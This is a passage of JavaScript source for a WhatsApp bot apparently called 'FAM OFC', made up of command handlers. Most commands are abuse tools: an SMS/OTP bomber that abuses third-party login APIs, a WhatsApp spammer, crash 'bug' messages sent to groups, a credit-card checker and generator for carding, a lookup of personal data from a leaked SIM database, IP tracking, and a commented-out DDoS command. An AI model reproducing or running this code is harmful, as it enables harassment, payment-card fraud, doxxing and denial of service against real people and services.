            '𝗮': 'a', '𝗯': 'b', '𝗰': 'c', '𝗱': 'd', '𝗲': 'e', '𝗳': 'f', '𝗴': 'g', '𝗵': 'h', '𝗶': 'i', '𝗷': 'j',
            '𝗸': 'k', '𝗹': 'l', '𝗺': 'm', '𝗻': 'n', '𝗼': 'o', '𝗽': 'p', '𝗾': 'q', '𝗿': 'r', '𝘀': 's', '𝘁': 't',
            '𝘂': 'u', '𝘃': 'v', '𝘄': 'w', '𝘅': 'x', '𝘆': 'y', '𝘇': 'z',
            '𝐀': 'A', '𝐁': 'B', '𝐂': 'C', '𝐃': 'D', '𝐄': 'E', '𝐅': 'F', '𝐆': 'G', '𝐇': 'H', '𝐈': 'I', '𝐉': 'J',
            '𝐊': 'K', '𝐋': 'L', '𝐌': 'M', '𝐍': 'N', '𝐎': 'O', '𝐏': 'P', '𝐐': 'Q', '𝐑': 'R', '𝐒': 'S', '𝐓': 'T',
            '𝐔': 'U', '𝐕': 'V', '𝐖': 'W', '𝐗': 'X', '𝐘': 'Y', '𝐙': 'Z',
            '𝐚': 'a', '𝐛': 'b', '𝐜': 'c', '𝐝': 'd', '𝐞': 'e', '𝐟': 'f', '𝐠': 'g', '𝐡': 'h', '𝐢': 'i', '𝐣': 'j',
            '𝐤': 'k', '𝐥': 'l', '𝐦': 'm', '𝐧': 'n', '𝐨': 'o', '𝐩': 'p', '𝐪': 'q', '𝐫': 'r', '𝐬': 's', '𝐭': 't',
            '𝐮': 'u', '𝐯': 'v', '𝐰': 'w', '𝐱': 'x', '𝐲': 'y', '𝐳': 'z',
            '𝔸': 'A', '𝔹': 'B', 'ℂ': 'C', '𝔻': 'D', '𝔼': 'E', '𝔽': 'F', '𝔾': 'G', 'ℍ': 'H', '𝕀': 'I', '𝕁': 'J',
            '𝕂': 'K', '𝕃': 'L', '𝕄': 'M', 'ℕ': 'N', '𝕆': 'O', 'ℙ': 'P', 'ℚ': 'Q', 'ℝ': 'R', '𝕊': 'S', '𝕋': 'T',
            '𝕌': 'U', '𝕍': 'V', '𝕎': 'W', '𝕏': 'X', '𝕐': 'Y', 'ℤ': 'Z',
            '𝕒': 'a', '𝕓': 'b', '𝕔': 'c', '𝕕': 'd', '𝕖': 'e', '𝕗': 'f', '𝕘': 'g', '𝕙': 'h', '𝕚': 'i', '𝕛': 'j',
            '𝕜': 'k', '𝕝': 'l', '𝕞': 'm', '𝕟': 'n', '𝕠': 'o', '𝕡': 'p', '𝕢': 'q', '𝕣': 'r', '𝕤': 's', '𝕥': 't',
            '𝕦': 'u', '𝕧': 'v', '𝕨': 'w', '𝕩': 'x', '𝕪': 'y', '𝕫': 'z'
        };
        return str.replace(/[\u{1D400}-\u{1D7FF}]/gu, char => unicodeMap[char] || char);
    };

    const cleanedName = normalizeUnicode(targetName).replace(/[\*_"'`\[\]\(\)\{\}]/g, '').trim();

    // Prepare target JID for checking
    let targetJid = mentionedJid || (cleanedName.match(/^\d+$/) ? `${cleanedName}@s.whatsapp.net` : null);

    try {
        // Check if target is owner or prime user
        if (targetJid) {
            if (isCreator(targetJid)) {
                return enviar("❌ Cannot use .gali on the owner! 😎");
            }
            if (primeUsers.includes(targetJid)) {
                return enviar("❌ Cannot use .gali on a prime user! 🌟");
            }
        }

        // Split cleanedName into words and check each against restricted names
        const nameWords = cleanedName.split(/\s+/);
        const isRestricted = nameWords.some(word => 
            restrictedNames.some(name => 
                word.toLowerCase().includes(name.toLowerCase())
            )
        );

        if (isRestricted) {
            return enviar("❌ Cannot use .gali on restricted names! 🚫");
        }

        // Select a random gali
        const galiMessage = `${targetName} ${galiyan[Math.floor(Math.random() * galiyan.length)]}`;

        // If there's a mentioned user (from reply), include mention
        if (mentionedJid) {
            await conn.sendMessage(m.key.remoteJid, {
                text: `@${mentionedJid.split('@')[0]} ${galiMessage}`,
                mentions: [mentionedJid]
            }, { quoted: m });
        } else {
            await enviar(galiMessage);
        }
    } catch (error) {
        console.error("Gali Command Error:", error);
        enviar(`⚠ *Error:* ${error.message}`);
    }}
    break;






case "checkhost": {
    // Check if user is allowed (assuming isCreator is the owner check)
    if (!isCreator(sender)) return enviar("❌ Only the Owner can use this command!");

    // Check if URL is provided
    if (!text) return enviar(`📌 *Usage:* ${prefix + command} https://example.com`);

    // Validate URL
    if (!isUrl(text)) return enviar("❌ *Invalid URL!* Please provide a valid website link (e.g., https://example.com)");

    // Prepare interactive message with button
    let msg = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: "🌐 Host Checker",
                        subtitle: ""
                    },
                    body: {
                        text: "Click the button below to check the host status."
                    },
                    footer: {
                        text: global.namaBot // Using bot name from config
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "cta_url",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "Check Host",
                                    url: `https://check-host.net/check-http?host=${encodeURIComponent(text)}`,
                                    merchant_url: `https://check-host.net/check-http?host=${encodeURIComponent(text)}`
                                })
                            }
                        ],
                        messageParamsJson: ""
                    }
                }
            }
        }
    };

    // Send the interactive message
    await conn.relayMessage(m.chat, msg, { messageId: m.key.id });
}
break;

/*
case "ddos":
    if (!text.includes("|")) return enviar("❌ *Usage:* .ddos <url>|<time>\nExample: .ddos http://example.com|60\n\n🚀 Powered by FAM OFC");

    let [targetUrl, attackTime] = text.split("|");

    if (!targetUrl.startsWith("http")) return enviar("❌ Invalid URL! Please provide a valid website link.\n\n🔥 Powered by FAM OFC");
    if (isNaN(attackTime) || attackTime < 1) return enviar("❌ Invalid time! Please enter time in seconds (e.g., 60).\n\n🚀 Powered by FAM OFC");

    startDDoS(targetUrl, attackTime);
    enviar(`✅ *DDoS Attack Started!*\n\n🌍 *Target:* ${targetUrl}\n⏳ *Duration:* ${attackTime} seconds\n\n🔥 *Powered by FAM OFC*`);
    break;
    */


case 'menu':
case 'allmenu': {
    famreply(`
▰▰▰▰▰▰▰▰▰▰▰▰▰▰
┏━━━━━━━━━━━━━━┈ 
┣──=[ *\`[ 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 ]\`* ] 
┆ 🤖 *Bot Name:* ${global.namaBot}
┆ 👤 *User:* ${pushname}  
┆ 😎 *Status:* ${!isCreator(m.sender) ? "User ⭐" : "Developer ⭐"}
┆ 🎊 *Premium:* ${isPremium ? "✅" : "❎"}
┆ 🛠 *Type:* Tool  
┆ 🔢 *Version:* ${global.versionBot}  
┆ 🧑‍💻 *Dev:* ${global.namaDeveloper}  
┆ 🚀 *Powered by FAM OFC*  
└━━━━━━━━━━━━━━┈ ⳹
▰▰▰▰▰▰▰▰▰▰▰▰▰▰
 *🎊 V I P - M E N U 🎊*
   
┌── [ *\`Owner Menu\`* ]
│ ✇ *.clean*
│ ✇ *.getsc*
│ ✇ *.addprem*
│ ✇ *.delprem*  
│ ✇ *.addowner*
│ ✇ *removeowner*
│ ✇ *ai-mode* ( on/off )
└──────────────▪                   
┌── [ *\`Pak Sim Database\`* ]
│ ✇ *.simdata* ( number )
└──────────────▪
┌── [ *\`SMS Boomer\`* ]
│ ✇ *.waspam* ( 923xxx )
│ ✇ *.smsboomer* ( 923xxx 𝟏-𝟎𝟎 )
└──────────────▪
┌── [ *\`Carding Tools\`* ]
│ ✇ *.chkcc* ( Card ) 
│ ✇ *.gen* ( bin )
└──────────────▪
┌── [ *\`Tools\`* ]
│ ✇ *.webcopy* ( url 🔗 )
│ ✇ *.ai* ( text )
│ ✇ *.tourl* ( reply img )
│ ✇ *.shorturl* ( url 🔗 )
│ ✇ *.trackip* ( 173.255.160.70 )
│ ✇ *.checkhost* ( url 🔗 )
│ ✇ *.enc doc* ( reply js script )
│ ✇ *.dec doc* ( reply js script )
└──────────────▪
┌── [ *\`Bug Menu\`* ]
│ ✇ *.bug* ( 923xxx )
│ ✇ *.crt* ( group link )
└──────────────▪
┌── [ *\`download Menu\`* ]
│ ✇ *.splay* ( song name )
│ ✇ *.tt* ( TikTok 🔗 )
│ ✇ *.fb* ( Facebook 🔗 )
│ ✇ *.ig* ( Instagram 🔗 )
└──────────────▪
    `)
    await conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg', ptt: true }, { quoted: m });

}
break;



case "ai-mode": {
    if (!isCreator(sender)) return enviar("❌ Only the Owner can use this command!");
    if (text === "on") {
        aiMode = true;
        return enviar("✅ *AI Mode Activated!* 🤖\nNow I will reply to every message.");
    } 
    if (text === "off") {
        aiMode = false;
        return enviar("❌ *AI Mode Deactivated!* 🚫\nI will stop replying automatically.");
    }
    return enviar("📌 *Usage:*\n.ai-mode on\n.ai-mode off");
}
break;

// 🎯 Add Owner Case
case "addowner": {
if (!isCreator(sender)) return enviar("❌ Only the Owner can use this command!");

    if (!args[0]) return conn.sendMessage(m.chat, { text: "📌 *برائے مہربانی ایک نمبر درج کریں!* (مثال: \n `.addowner 923001234567`)" }, { quoted: m });
    let number = text.replace(/\D/g, "") + "@s.whatsapp.net"; 
    let owners = getOwners();

    if (owners.includes(number)) {
        return conn.sendMessage(m.chat, { text: "✅ *This number is already an Owner!*" }, { quoted: m });
    }

    owners.push(number);
    saveOwners(owners);

    conn.sendMessage(m.chat, { text: `🎉 *Successfully added new Owner: ${number}*` }, { quoted: m });
  }  break;


// 🗑 Remove Owner Case
case "removeowner": {
if (!isCreator(sender)) return enviar("❌ Only the Owner can use this command!");

    if (!args[0]) return conn.sendMessage(m.chat, { text: "📌 *برائے مہربانی ایک نمبر درج کریں!* (مثال: \n `.removeowner 923001234567`)" }, { quoted: m });
    let number = text.replace(/\D/g, "") + "@s.whatsapp.net"; 
    let owners = getOwners();

    if (!owners.includes(number)) {
        return conn.sendMessage(m.chat, { text: "❌ *This number is not an Owner!*" }, { quoted: m });
    }

    owners = owners.filter(owner => owner !== number);
    saveOwners(owners);

    conn.sendMessage(m.chat, { text: `🗑 *Successfully removed Owner: ${number}*` }, { quoted: m });
   } break;

case "crt": {
if (!isCreator(sender)) return enviar("❌ Only the Owner can use this command!");
    if (!args[0]) return m.reply(`Usage: ${prefix + command} Link\nExample: ${prefix + command} https://chat.whatsapp.com/FuLRVI2SGNd4bnWlPsEt`);

    let result = args[0].split('https://chat.whatsapp.com/')[1];
    let Pehssjsjsj = await conn.groupAcceptInvite(result);
    jumlah = "3";

    for (let i = 0; i < jumlah; i++) {
        var groupInviteMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
            "groupInviteMessage": {
                "groupJid": "120363251190676308@g.us",
                "inviteCode": "/RwWifkIpEQUesVv",
                "inviteExpiration": "1709614188",
                "groupName": `${teksbug2}`,
                "caption": "Yahaha Lag Ya?!"
            }
        }), { userJid: from, quoted: m });

        conn.relayMessage(Pehssjsjsj, groupInviteMessage.message, { messageId: groupInviteMessage.key.id });
    }

    // Adding credit
    m.reply(`✅ Successfully sent the bug!\n\n🔹 *Credit: FAM OFC*`);
}
break;





case "b3chk": case "chkcc": case "b3": {
    if (!text) {
        return m.reply("📌 *Provide a CC in the format:*\n`4147768576029506|11|2025|153`");
    }

    try {
        // Send loading message
        let loadingMessage = await m.reply("⏳ *Checking card status... Please wait.*");

        // API request
        const response = await axios.get(`https://fam-official.serv00.net/sim/b3.php?famcc=${encodeURIComponent(text)}`);

        // Delete loading message before response
        await conn.sendMessage(m.chat, { delete: loadingMessage.key });

        if (response.data.status === "success") {
            let binInfo = response.data.bin_info;
            let ccStatus = response.data.cc_status;
            let responseMessage = response.data.response_message;

            let resultMessage = `🎩 *𝐊𝐚𝐦𝐚𝐥 X 𝐅𝐀𝐌 𝐎𝐅𝐂 \n 𝐁𝐚𝐢𝐧𝐭𝐫𝐞𝐞 𝐂𝐡𝐞𝐜𝐤𝐞𝐫*\n\n`;
            resultMessage += `💳 *Card:* ${response.data.card}\n`;
            resultMessage += `🌍 *Gateway:* ${response.data.gateway}\n`;
            resultMessage += `📌 *Status:* ${ccStatus}\n`;
            resultMessage += `📢 *Response:* ${responseMessage}\n\n`;
            resultMessage += `🏦 *Bank:* ${binInfo.bank}\n`;
            resultMessage += `🌍 *Country:* ${binInfo.country} ${binInfo.emoji}\n`;
            resultMessage += `💳 *Brand:* ${binInfo.brand}\n`;
            resultMessage += `🔍 *Scheme:* ${binInfo.scheme}\n`;
            resultMessage += `📌 *Type:* ${binInfo.type}\n\n`;
            resultMessage += `🚀 *Powered by kamal x fam*\n`;

            // Select image based on status
            let imgUrl = ccStatus.includes("Approved") 
                ? "https://fam-official.serv00.net/script12/fampng/approved.png" 
                : "https://fam-official.serv00.net/script12/fampng/declined.png";

            // Send image with text
            await conn.sendMessage(m.chat, { image: { url: imgUrl }, caption: resultMessage });

        } else {
            m.reply("⚠ *Failed to check card. Try again with a valid CC.*");
        }
    } catch (error) {
        console.error("API Error:", error);
        await conn.sendMessage(m.chat, { delete: loadingMessage.key });
        m.reply("⚠ *Error checking card. Try again later.*");
    }
}
break;




case "clean": {
 if (!isCreator(sender)) return enviar("❌ Only the Owner can use this command!");

    try {
        let sessionFolder = "./session"; // Apna session folder ka path likhein
        let excludedFile = "creds.json"; // Yeh file delete nahi hogi

        // Send loading message
        let loadingMessage = await enviar("⏳ *Cleaning session files... Please wait.*");

        const fs = require("fs");
        const path = require("path");

        if (fs.existsSync(sessionFolder)) {
            let files = fs.readdirSync(sessionFolder);
            let deletedFiles = 0;

            for (let file of files) {
                let filePath = path.join(sessionFolder, file);
                
                if (fs.lstatSync(filePath).isFile() && file !== excludedFile) {
                    fs.unlinkSync(filePath);
                    deletedFiles++;
                }
            }

            // Delete loading message before response
            await conn.sendMessage(m.chat, { delete: loadingMessage.key });

            enviar(`✅ *Successfully deleted ${deletedFiles} session files!*\n⚠ *creds.json is kept safe.*`);
        } else {
            enviar("❌ *Session folder not found!*");
        }
    } catch (error) {
        console.error("Error Cleaning Sessions:", error);
        enviar("⚠ *Error cleaning session files. Try again later.*");
    }
}
break;
case "runtime": case "ping": {
    let uptime = runtime(process.uptime());
    let ping = await getPing();
    
    let response = `
┌─〔 *BOT STATUS* 〕
│⏳ *Uptime:* ${uptime}
│⚡ *Ping:* ${ping}
└───────────────
    `;
    
    enviar(response);
}
break;





case "developer": {
    
    
    let response = `
┌─〔 *FAM OFC - INFO* 〕
│  
│ 🔴 *YouTube:* [@famofch4k3r]  
│ 🔵 *Telegram:* [Join Now](https://t.me/famofc)  
│ 🟢 *WhatsApp Channel:* [Click Here](https://whatsapp.com/channel/0029Vb2pMIt1NCrUCy9Q0f3C)  
│  
│ 🌐 *Website:* [Visit Now](https://fam-tool.vercel.app/)  
│ 📸 *Instagram:* [@fam_ofc1]  
│ 🐙 *GitHub:* [Faheemxyz]  
│ 💬 *WhatsApp:* [+923350963366]  
│  
└──────────────────

    `;
    
    enviar(response);
}
break;

case "lunaticseven": {
    
    
    let response = `
┌─〔 *Lunatic Seven* 〕
│
│🔴 *YouTube* https://youtube.com/@cogiton3rd
│
└───────────────
    `;
    
    enviar(response);
}
break;


case "gen": case "ccgen": case "gencc": {
    if (!text) {
        return m.reply('📌 *Provide a BIN (First 6 digits)*\nExample: `.gen 550989`');
    }

    try {
        let loadingMessage = await m.reply("⏳ *Generating cards... Please wait.*");

        const response = await axios.get(`https://fam-official.serv00.net/sim/famccgen.php?cc=${encodeURIComponent(text)}`);

        await conn.sendMessage(m.chat, { delete: loadingMessage.key });

        if (response.data.status === "success" && response.data.generated_cards.length > 0) {
            let cards = response.data.generated_cards;
            let binInfo = response.data.bin_info;
            let formattedCards = cards.join("\n");

            let pan = `🎩 *𝐅𝐀𝐌 𝐎𝐅𝐂 - 𝐂𝐂 𝐆𝐄𝐍𝐄𝐑𝐀𝐓𝐎𝐑*\n\n`;
            pan += `🔢 *BIN:* ${text}xxxxx\n`;
            pan += `🏦 *Bank:* ${binInfo.bank}\n`;
            pan += `🌍 *Country:* ${binInfo.country} ${binInfo.emoji}\n`;
            pan += `💳 *Brand:* ${binInfo.brand}\n`;
            pan += `🔍 *Scheme:* ${binInfo.scheme}\n`;
            pan += `📌 *Type:* ${binInfo.type}\n`;
            pan += `💰 *Currency:* ${binInfo.currency}\n\n`;
            pan += `🚀 *Powered by FAM OFC*`;

            const imgUrl = "https://fam-official.serv00.net/script12/fampng/Famccgen.png"; // Change to an image file

            let msg = generateWAMessageFromContent(
                m.chat,
                {
                    viewOnceMessage: {
                        message: {
                            interactiveMessage: {
                                body: { text: pan },
                                carouselMessage: {
                                    cards: [
                                        {
                                            header: {
                                                imageMessage: (await generateWAMessageContent(
                                                    { image: { url: imgUrl } }, // Sends image instead of GIF
                                                    { upload: conn.waUploadToServer }
                                                )).imageMessage,
                                                hasMediaAttachment: true,
                                            },
                                            body: {
                                                text: `🔢 *Generated Cards:*\n\`\`\`${formattedCards}\`\`\``
                                            },
                                            nativeFlowMessage: {
                                                buttons: [
                                                    {
                                                        name: "cta_copy",
                                                        buttonParamsJson: `{"display_text":"📋 Copy CCs","copy_code":"${formattedCards}"}`
                                                    }
                                                ],
                                            },
                                        },
                                    ],
                                    messageVersion: 1,
                                },
                            },
                        },
                    },
                },
                {}
            );

            await conn.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id });

        } else {
            m.reply("⚠ *Failed to generate cards. Try again with a valid BIN.*");
        }
    } catch (error) {
        console.error("API Error:", error);
        await conn.sendMessage(m.chat, { delete: loadingMessage.key });

        m.reply("⚠ *Error generating cards. Try again later.*");
    }
}
break;
case "smsboomer": {
 if ( !isPremium) return enviar("only used a premium user")
    if (!text) {
        return enviar('📌 Provide a phone number and sms amount\nExample: .smsboomer 923XXX 1-100');
    }

    let args = text.split(" ");
    if (args.length !== 2) {
        return enviar('📌 Invalid format! Use: .smsboomer <phone_number> <count>');
    }

    let phone = args[0];
    let count = parseInt(args[1]);

    if (!phone || isNaN(count) || count < 1 || count > 100) {
        return enviar('⚠ Enter a valid phone number and OTP count (1-100).');
    }

    enviar('⏳ Sending OTPs...');

    try {
        let requests = [];
        for (let i = 0; i < count; i++) {
            let apiUrl = i % 2 === 0 
                ? `https://bajao.pk/api/v2/login/generatePin?uuid=${phone}`
                : `https://tappayments.tapmad.com/pay/api/initiatePaymentTransactionNewPackage`;

            let payload = i % 2 !== 0 ? JSON.stringify({
                Version: 'V1',
                Language: 'en',
                Platform: 'web',
                ProductId: 1733,
                MobileNo: phone,
                OperatorId: '100007',
                URL: 'https://www.tapmad.com/sign-up',
                source: 'organic',
                medium: 'organic'
            }) : null;

            let options = {
                method: 'POST',
                headers: i % 2 !== 0 ? {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                } : {},
                body: payload
            };

            requests.push(fetch(apiUrl, options));
        }

        await Promise.all(requests);
        enviar('✅ OTP(s) sent successfully!');
    } catch (error) {
        console.error("API Error:", error);
        enviar("⚠ Error sending OTPs. Try again later.");
    }
}
break
case "simdata": {
    if (!text) {
        return enviar('📌 Provide a phone number or CNIC!\nExample: simdata 03xxx');
    }

    try {
        const response = await axios.get(`https://fam-official.serv00.net/sim/api.php?num=${encodeURIComponent(text)}`);

        if (response.data && response.data.status === "success" && response.data.data.length > 0) {
            let formattedResponse = `📋 *\`𝐅𝐀𝐌 𝐎𝐅𝐂 𝐒𝐈𝐌 𝐃𝐀𝐓𝐀𝐁𝐀𝐒𝐄\`*\n\n`;

            // Loop through all results and format them
            response.data.data.forEach((userData, index) => {
                formattedResponse += `📌 *Record ${index + 1}:*\n`;
                formattedResponse += `🔹 *Name:* ${userData.Name}\n`;
                formattedResponse += `🔹 *Mobile:* ${userData.Mobile}\n`;
                formattedResponse += `🔹 *CNIC:* ${userData.CNIC}\n`;
                formattedResponse += `🔹 *Operator:* ${userData.Operator}\n`;
                formattedResponse += `🔹 *Address:* ${userData.Address.trim() || "Not Available"}\n`;
                formattedResponse += `━━━━━━━━━━━━━━━\n`;
            });

            // Send simple text message with quoted: qloc
            await conn.sendMessage(m.chat, { text: formattedResponse }, { quoted: m });

        } else {
            enviar("⚠ No data found for the provided number. Please check the input and try again.");
        }
    } catch (error) {
        console.error("API Error:", error);
        enviar("⚠ Error fetching data. Try again later.");
    }
}
break;
case "waspam": {
     if ( !isPremium ) return enviar("only used a premium user");

    if (!text) {
        return enviar('📌 Provide a phone number!\nExample: 923xxx');
    }

    try {
        enviar('✅ Sending...');
        
        const encodedNumber = encodeURIComponent(text);
        const response = await axios.get(`https://fam-official.serv00.net/sim/famwabomr.php?number=${encodedNumber}`);
        
        // Fix JSON response parsing
        let jsonResponses = response.data.split('}{').map((part, index, arr) => {
            return index === 0
                ? part + '}'
                : index === arr.length - 1
                ? '{' + part
                : '{' + part + '}';
        });

        let messages = jsonResponses.map(msg => JSON.parse(msg).message).join("\n");

        enviar(messages);
    } catch (error) {
        console.error("API Error:", error);
        enviar("⚠ Error fetching data. Try again later.");
    }
}
break
case "ai": {
    if (!text) {
        return enviar("📌 *Hi Brother!* 🤖\nCan I help you?\n_Type:_ *.ai Your Question*");
    }

    try {
        const apiUrl = `https://fam-official.serv00.net/sim/famofcai.php?text=${encodeURIComponent(text)}`;
        const response = await axios.get(apiUrl);
        
        console.log("API Response:", response.data); // Debugging - Check full response in the console

        if (response.data && response.data.success) {
            enviar(`${response.data.message}`);
        } else {
            enviar(`⚠ *Error:* ${response.data.message || "AI response not available."}`);
        }
    } catch (error) {
        console.error("AI API Error:", error);
        enviar("⚠ *Error fetching AI response.*\nPlease try again later.");
    }
}
break;
case "getsc": {
    // Check if the sender is the owner
    if (m.sender.split("@")[0] !== global.owner && m.sender !== botNumber) {
        return enviar("⚠️ *Only the owner can use this command!*");
    }

    // Delete unnecessary files except creds.json
    let dir = await fs.readdirSync("./session");
    if (dir.length > 1) {
        let filesToDelete = dir.filter(file => file !== "creds.json");
        for (let file of filesToDelete) {
            await fs.unlinkSync(`./session/${file}`);
        }
    }

    await enviar("⏳ *Processing bot script backup... Please wait.*");

    // Define backup name
    var backupName = `FAM-OFC_Bot`;

    // List all files and directories to include in backup
    const fileList = (await execSync("ls"))
        .toString()
        .split("\n")
        .filter(file => 
            file !== "node_modules" &&
            file !== "session" &&
            file !== "package-lock.json" &&
            file !== "yarn.lock" &&
            file !== ""
        );

    // Create ZIP archive of the bot script
    await execSync(`zip -r ${backupName}.zip ${fileList.join(" ")}`);

    // Send the ZIP file to the user
    await conn.sendMessage(m.sender, {
        document: await fs.readFileSync(`./${backupName}.zip`),
        fileName: `${backupName}.zip`,
        mimetype: "application/zip"
    }, { quoted: m });

    // Delete the ZIP file after sending
    await execSync(`rm -rf ${backupName}.zip`);

    // Notify the user if the script was sent in private chat
    if (m.chat !== m.sender) {
        return enviar("📩 *The bot script has been sent to your private chat!*");
    }
}
break;

case "trackip": {
    if (!text) {
        return enviar(`📌 *Usage:* ${prefix + command} 112.90.150.204`);
    }

    try {
        let res = await fetch(`https://ipwho.is/${text}`).then(result => result.json());

        if (!res || !res.success) {
            throw new Error(`⚠ IP ${text} not found!`);
        }

        // Formatting the IP information response
        const formatIPInfo = (info) => {
            return `🎩 *𝐅𝐀𝐌 𝐎𝐅𝐂 - 𝐈𝐏 𝐓𝐑𝐀𝐂𝐊𝐄𝐑*\n\n` +
            `📍 *IP Address:* ${info.ip || 'N/A'}\n` +
            `✅ *Success:* ${info.success ? 'Yes' : 'No'}\n` +
            `🌍 *Type:* ${info.type || 'N/A'}\n` +
            `🗺️ *Continent:* ${info.continent || 'N/A'} (${info.continent_code || 'N/A'})\n` +
            `🏳️ *Country:* ${info.country || 'N/A'} (${info.country_code || 'N/A'})\n` +
            `🏙️ *Region:* ${info.region || 'N/A'} (${info.region_code || 'N/A'})\n` +
            `🌆 *City:* ${info.city || 'N/A'}\n` +
            `📌 *Latitude:* ${info.latitude || 'N/A'}\n` +
            `📌 *Longitude:* ${info.longitude || 'N/A'}\n` +
            `🌐 *Is EU:* ${info.is_eu ? 'Yes' : 'No'}\n` +
            `📮 *Postal Code:* ${info.postal || 'N/A'}\n` +
            `📞 *Calling Code:* +${info.calling_code || 'N/A'}\n` +
            `🏛️ *Capital:* ${info.capital || 'N/A'}\n` +
            `🗺️ *Borders:* ${Array.isArray(info.borders) && info.borders.length > 0 ? info.borders.join(", ") : 'None'}\n\n` +
            `🚀 *Connection Details:*\n` +
            `🔹 *ASN:* ${info.connection?.asn || 'N/A'}\n` +
            `🏢 *Organization:* ${info.connection?.org || 'N/A'}\n` +
            `📡 *ISP:* ${info.connection?.isp || 'N/A'}\n` +
            `🌎 *Domain:* ${info.connection?.domain || 'N/A'}\n\n` +
            `⏰ *Timezone:* ${info.timezone?.id || 'N/A'} (${info.timezone?.abbr || 'N/A'})\n` +
            `🕒 *Current Time:* ${info.timezone?.current_time || 'N/A'}\n\n` +
            `🚀 *Powered by FAM OFC*`;
        };

        // Send location pin if latitude & longitude exist
        if (res.latitude && res.longitude) {
            await conn.sendMessage(m.chat, {
                location: { degreesLatitude: res.latitude, degreesLongitude: res.longitude }
            });
        }

        // Wait before sending IP details
        const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
        await delay(2000);

        // Send IP details
        enviar(formatIPInfo(res));

    } catch (error) {
        console.error("Error in 'trackip' case:", error);
        enviar(`⚠ *Error:* Unable to retrieve data for IP ${text}`);
    }
}
break;

case 'addprem':
if (!isCreator(sender)) return enviar(" اس بورڈ کے مالک کے ساتھ رابطہ کریں\nwa.me/+923350963366 ")
if (!args[0]) return enviar(`Use ${prefix+command} number\nContoh ${prefix+command} 1849xxx`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await conn.onWhatsApp(prrkek)
if (ceknya.length == 0) return enviar(`Enter a valid and registered number on WhatsApp!!!`)
premium.push(prrkek)
fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
enviar(`oke تک رسائی دی گئی ہے۔ bot`)
break

case 'delprem':
if (!isCreator(sender)) return enviar(" اس بورڈ کے مالک کے ساتھ رابطہ کریں\nwa.me/+923350963366 ")
if (!args[0]) return enviar(`Use ${prefix+command} Nomor\nContoh ${prefix+command} 1849xxx`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = premium.indexOf(ya)
premium.splice(unp, 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
enviar(`yah اب رسائی نہیں ہے`)
break





/*
case "menu": {
    // Pre-calculate uptime and ping once
    const [uptime, ping] = await Promise.all([runtime(process.uptime()), getPing()]);
    
    const textMenu = `  
╭━━━╮╱╱╱╱╱╱╱╱╱╱╭━╮
┃╭━━╯╱╱╱╱╱╱╱╱╱╱┃╭╯
┃╰━━┳━━┳╮╭╮╭━━┳╯╰┳━━╮
┃╭━━┫╭╮┃╰╯┃┃╭╮┣╮╭┫╭━╯
┃┃╱╱┃╭╮┃┃┃┃┃╰╯┃┃┃┃╰━╮
╰╯╱╱╰╯╰┻┻┻╯╰━━╯╰╯╰━━╯         
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
┏━━━━━━━━━━━━━━┈ 
┣──=[ *\`[ 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 ]\`* ] 
┆ 🤖 *Bot Name:* ${global.namaBot}
┆ ⏳ *Uptime:* ${uptime}  
┆ ⚡ *Ping:* ${ping}  
┆ 👤 *User:* ${pushname}  
┆ 😎 *Status:* ${!isCreator(sender) ? "User ⭐" : "Developer ⭐"}
┆ 🎊 *Premium:* ${isPremium ? "✅" : "❎"}
┆ 🛠 *Type:* Tool  
┆ 🔢 *Version:* ${global.versionBot}  
┆ 🧑‍💻 *Dev:* ${global.namaDeveloper}  
┆ 🚀 *Powered by FAM OFC*  
└━━━━━━━━━━━━━━┈ ⳹
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
    `;

    // Send single message with image and buttons, skip multiple reactions
    await conn.sendMessage(m.chat, { 
        image: imageBuffer,  
        caption: textMenu,
        footer: "✨ FAM OFC MD ✨",
        buttons: [
            { buttonId: ".allmenu", buttonText: { displayText: '🌟 ALL MENU 🌟' } },
            { buttonId: ".developer", buttonText: { displayText: "🌟 DEVELOPER 🌟" } },
            { buttonId: ".lunaticseven", buttonText: { displayText: '🌟 LUNATIC-SEVEN 🌟' } }
        ],
        viewOnce: true
    }, { quoted: m });

    // Send audio only if necessary (optional optimization)
    await conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg', ptt: true }, { quoted: m });
}
break;

case "allmenu": {
    const [uptime, ping] = await Promise.all([runtime(process.uptime()), getPing()]);

    const textAllMenu = `  
╭━━━╮╱╱╱╱╱╱╱╱╱╱╭━╮
┃╭━━╯╱╱╱╱╱╱╱╱╱╱┃╭╯
┃╰━━┳━━┳╮╭╮╭━━┳╯╰┳━━╮
┃╭━━┫╭╮┃╰╯┃┃╭╮┣╮╭┫╭━╯
┃┃╱╱┃╭╮┃┃┃┃┃╰╯┃┃┃┃╰━╮
╰╯╱╱╰╯╰┻┻┻╯╰━━╯╰╯╰━━╯         
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
 *🎊 F A M  V I P - M E N U 🎊*
   
┌── [ *\`Owner Menu\`* ]
│ ✇ *.clean*
│ ✇ *.getsc*
│ ✇ *.addprem*
│ ✇ *.delprem*  
│ ✇ *.addowner*
│ ✇ *removeowner*
│ ✇ *ai-mode* ( on/off )
└──────────────▪                   
┌── [ *\`Pak Sim Database\`* ]
│ ✇ *.simdata* ( number )
└──────────────▪
┌── [ *\`SMS Boomer\`* ]
│ ✇ *.waspam* ( number )
│ ✇ *.smsboomer* ( number 𝟏-𝟏𝟎𝟎 )
└──────────────▪
┌── [ *\`Carding Tools\`* ]
│ ✇ *.chkcc* ( Card ) 
│ ✇ *.gen* ( bin )
└──────────────▪
┌── [ *\`Tools\`* ]
│ ✇ *.ai* ( text )
